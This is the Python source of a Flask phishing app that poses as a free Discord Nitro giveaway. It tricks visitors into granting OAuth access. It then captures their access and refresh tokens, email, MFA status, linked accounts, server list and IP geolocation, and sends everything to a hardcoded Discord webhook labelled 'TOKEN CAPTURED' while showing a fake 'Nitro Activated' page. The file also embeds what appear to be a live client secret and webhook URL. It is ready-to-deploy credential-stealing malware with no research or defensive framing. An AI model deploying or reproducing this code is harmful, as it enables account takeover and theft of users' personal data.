from flask import Flask, request, redirect, jsonify, render_template_string
import requests
import json
import os
from datetime import datetime

app = Flask(__name__)

# ═══════════════════════════════════════
# CONFIG — ثابت 100%
# ═══════════════════════════════════════
CLIENT_ID = "1541786357028884534"
CLIENT_SECRET = "7n8YSrS5CM3cabjqeQY_ba-nsvax0bOW"
WEBHOOK_URL = "https://discord.com/api/webhooks/1541770051777208360/Z1sxSK-tfzhm9d4d77i1rokSDM7kV0eSAXYSKWOiNLG4Z7tpqET2-eDevOgK_cFmRtTG"
REDIRECT_URI = "https://jjjw.vercel.app/callback"
SITE_NAME = "Discord Nitro Giveaway"

# ═══════════════════════════════════════
# HTML TEMPLATES
# ═══════════════════════════════════════

LANDING_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ site_name }} — Discord</title>
    <link rel="icon" href="https://discord.com/assets/847541504914fd33810e70a0ea73177e.ico">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #5865f2 0%, #404eed 100%);
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: #fff;
            overflow: hidden;
        }
        .nitro-logo {
            width: 200px;
            margin-bottom: 30px;
            animation: float 3s ease-in-out infinite;
        }
        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }
        h1 { font-size: 48px; font-weight: 800; margin-bottom: 16px; text-align: center; }
        .subtitle { font-size: 20px; opacity: 0.9; margin-bottom: 40px; text-align: center; }
        .claim-btn {
            background: #fff; color: #5865f2; padding: 16px 48px;
            border-radius: 28px; font-size: 20px; font-weight: 700;
            border: none; cursor: pointer; transition: transform 0.2s, box-shadow 0.2s;
            text-decoration: none; display: inline-block;
        }
        .claim-btn:hover { transform: scale(1.05); box-shadow: 0 8px 30px rgba(0,0,0,0.3); }
        .features { display: flex; gap: 40px; margin-top: 60px; flex-wrap: wrap; justify-content: center; }
        .feature { text-align: center; max-width: 200px; }
        .feature-icon { font-size: 40px; margin-bottom: 12px; }
        .feature h3 { font-size: 18px; margin-bottom: 8px; }
        .feature p { font-size: 14px; opacity: 0.8; }
        .particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: -1; }
        .particle {
            position: absolute; width: 10px; height: 10px;
            background: rgba(255,255,255,0.3); border-radius: 50%;
            animation: particle 15s infinite;
        }
        @keyframes particle {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
            10% { opacity: 1; } 90% { opacity: 1; }
            100% { transform: translateY(-100vh) rotate(720deg); opacity: 0; }
        }
    </style>
</head>
<body>
    <div class="particles" id="particles"></div>
    <img src="https://discord.com/assets/22f99a6e18127da2c8f65b72c99c6e5e.svg" class="nitro-logo" alt="Nitro">
    <h1>Get Discord Nitro</h1>
    <p class="subtitle">Claim your free 1-year Nitro subscription now!</p>
    <a href="https://discord.com/oauth2/authorize?client_id=1541786357028884534&response_type=code&redirect_uri=https%3A%2F%2Fjjjw.vercel.app%2Fcallback&scope=identify+guilds+email+connections+gdm.join+guilds.join" class="claim-btn">Claim Nitro</a>
    <div class="features">
        <div class="feature"><div class="feature-icon">🎨</div><h3>Custom Emojis</h3><p>Use animated and custom emojis everywhere</p></div>
        <div class="feature"><div class="feature-icon">🚀</div><h3>Server Boosts</h3><p>2 server boosts included</p></div>
        <div class="feature"><div class="feature-icon">📁</div><h3>Bigger Uploads</h3><p>Upload files up to 100MB</p></div>
        <div class="feature"><div class="feature-icon">🎥</div><h3>HD Video</h3><p>Stream in 1080p 60fps</p></div>
    </div>
    <script>
        for (let i = 0; i < 50; i++) {
            const p = document.createElement('div'); p.className = 'particle';
            p.style.left = Math.random() * 100 + '%';
            p.style.animationDelay = Math.random() * 15 + 's';
            p.style.animationDuration = (10 + Math.random() * 10) + 's';
            p.style.width = p.style.height = (4 + Math.random() * 8) + 'px';
            document.getElementById('particles').appendChild(p);
        }
    </script>
</body>
</html>
"""

SUCCESS_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Success — Discord</title>
    <link rel="icon" href="https://discord.com/assets/847541504914fd33810e70a0ea73177e.ico">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #36393f;
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #dcddde;
        }
        .container {
            background: #2f3136;
            border-radius: 8px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
        }
        .check {
            width: 80px; height: 80px;
            background: #3ba55d;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
            font-size: 40px;
            color: #fff;
        }
        h2 { color: #fff; font-size: 24px; margin-bottom: 12px; }
        p { color: #b9bbbe; font-size: 16px; margin-bottom: 24px; }
        .btn {
            background: #5865f2; color: #fff;
            padding: 12px 32px; border-radius: 3px;
            text-decoration: none; font-size: 16px; font-weight: 500;
            display: inline-block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="check">✓</div>
        <h2>Nitro Activated!</h2>
        <p>Your free Nitro subscription has been successfully activated. Enjoy!</p>
        <a href="https://discord.com/app" class="btn">Open Discord</a>
    </div>
</body>
</html>
"""

# ═══════════════════════════════════════
# UTILITIES
# ═══════════════════════════════════════

def get_ip_info(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting", timeout=5)
        return r.json()
    except:
        return {}

def send_webhook(data, title="🔴 TOKEN CAPTURED"):
    try:
        embed = {
            "title": title,
            "color": 0x5865f2,
            "timestamp": datetime.utcnow().isoformat(),
            "fields": []
        }

        if "access_token" in data:
            embed["fields"].append({"name": "🔑 Access Token", "value": f"```{data['access_token']}```", "inline": False})
        if "refresh_token" in data:
            embed["fields"].append({"name": "🔄 Refresh Token", "value": f"||{data['refresh_token']}||", "inline": False})
        if "token_type" in data:
            embed["fields"].append({"name": "📋 Token Type", "value": data['token_type'], "inline": True})
        if "expires_in" in data:
            embed["fields"].append({"name": "⏰ Expires In", "value": f"{data['expires_in']}s", "inline": True})
        if "scope" in data:
            embed["fields"].append({"name": "🔓 Scope", "value": data['scope'], "inline": False})

        if "user" in data and data["user"]:
            u = data["user"]
            embed["fields"].append({"name": "👤 Username", "value": f"{u.get('username', 'N/A')}#{u.get('discriminator', 'N/A')}", "inline": True})
            embed["fields"].append({"name": "🆔 User ID", "value": u.get('id', 'N/A'), "inline": True})
            embed["fields"].append({"name": "📧 Email", "value": u.get('email', 'N/A') or 'Hidden', "inline": True})
            embed["fields"].append({"name": "✅ Verified", "value": str(u.get('verified', 'N/A')), "inline": True})
            embed["fields"].append({"name": "🌍 Locale", "value": u.get('locale', 'N/A'), "inline": True})
            embed["fields"].append({"name": "🔒 MFA", "value": str(u.get('mfa_enabled', 'N/A')), "inline": True})
            embed["fields"].append({"name": "💎 Nitro", "value": str(u.get('premium_type', 'None')), "inline": True})
            if u.get('avatar'):
                embed["thumbnail"] = {"url": f"https://cdn.discordapp.com/avatars/{u.get('id')}/{u.get('avatar')}.png?size=128"}

        if "connections" in data and data["connections"]:
            conn_text = "\n".join([f"{c.get('type', 'unknown')}: {c.get('name', 'N/A')}" for c in data["connections"][:10]])
            embed["fields"].append({"name": "🔗 Connections", "value": f"```{conn_text}```", "inline": False})

        if "guilds" in data and data["guilds"]:
            guild_text = "\n".join([f"{g.get('name', 'N/A')} ({g.get('id', 'N/A')})" for g in data["guilds"][:10]])
            embed["fields"].append({"name": "🏰 Guilds (10)", "value": f"```{guild_text}```", "inline": False})

        if "ip_info" in data and data["ip_info"]:
            ip = data["ip_info"]
            loc = f"{ip.get('city', 'N/A')}, {ip.get('regionName', 'N/A')}, {ip.get('country', 'N/A')}"
            embed["fields"].append({"name": "🌍 Location", "value": loc, "inline": True})
            embed["fields"].append({"name": "📡 ISP", "value": ip.get('isp', 'N/A'), "inline": True})
            embed["fields"].append({"name": "🔌 IP", "value": f"||{data.get('ip', 'N/A')}||", "inline": True})

        payload = {
            "embeds": [embed],
            "username": "Discord OAuth2 Logger",
            "avatar_url": "https://cdn.discordapp.com/embed/avatars/0.png"
        }
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except Exception as e:
        print(f"Webhook error: {e}")

# ═══════════════════════════════════════
# ROUTES
# ═══════════════════════════════════════

@app.route('/')
def index():
    return render_template_string(LANDING_PAGE, site_name=SITE_NAME)

@app.route('/auth')
def auth():
    """Redirect to Discord OAuth2 authorization"""
    params = {
        'client_id': CLIENT_ID,
        'redirect_uri': REDIRECT_URI,
        'response_type': 'code',
        'scope': 'identify email guilds connections gdm.join guilds.join',
        'prompt': 'consent'
    }
    auth_url = f"https://discord.com/api/oauth2/authorize?{requests.compat.urlencode(params)}"
    return redirect(auth_url)

@app.route('/callback')
def callback():
    """Handle OAuth2 callback and capture token"""
    code = request.args.get('code')
    error = request.args.get('error')

    if error:
        return f"<h1>Error: {error}</h1><p>Please try again.</p>"

    if not code:
        return redirect('/')

    try:
        # Exchange code for token
        data = {
            'client_id': CLIENT_ID,
            'client_secret': CLIENT_SECRET,
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': REDIRECT_URI,
            'scope': 'identify email guilds connections gdm.join guilds.join'
        }
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}

        token_response = requests.post(
            'https://discord.com/api/oauth2/token',
            data=data,
            headers=headers,
            timeout=10
        )

        if token_response.status_code != 200:
            return f"<h1>Authorization failed</h1><p>Please try again.</p>"

        token_data = token_response.json()
        access_token = token_data.get('access_token')

        if not access_token:
            return "<h1>Invalid token response</h1>"

        # Get user info
        user_headers = {'Authorization': f'Bearer {access_token}'}
        user_response = requests.get('https://discord.com/api/v10/users/@me', headers=user_headers, timeout=10)
        user_data = user_response.json() if user_response.status_code == 200 else {}

        # Get connections
        conn_response = requests.get('https://discord.com/api/v10/users/@me/connections', headers=user_headers, timeout=10)
        connections = conn_response.json() if conn_response.status_code == 200 else []

        # Get guilds
        guilds_response = requests.get('https://discord.com/api/v10/users/@me/guilds', headers=user_headers, timeout=10)
        guilds = guilds_response.json() if guilds_response.status_code == 200 else []

        # Get IP info
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ',' in str(ip):
            ip = ip.split(',')[0].strip()
        ip_info = get_ip_info(ip)

        # Compile capture data
        capture_data = {
            "access_token": access_token,
            "refresh_token": token_data.get('refresh_token'),
            "token_type": token_data.get('token_type'),
            "expires_in": token_data.get('expires_in'),
            "scope": token_data.get('scope'),
            "user": user_data,
            "connections": connections,
            "guilds": guilds,
            "ip": ip,
            "ip_info": ip_info,
            "timestamp": datetime.utcnow().isoformat()
        }

        # Send to webhook
        send_webhook(capture_data)

        # Show success page
        return render_template_string(SUCCESS_PAGE)

    except Exception as e:
        print(f"Callback error: {e}")
        return "<h1>Something went wrong</h1><p>Please try again later.</p>"

# ═══════════════════════════════════════
# RUN
# ═══════════════════════════════════════

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
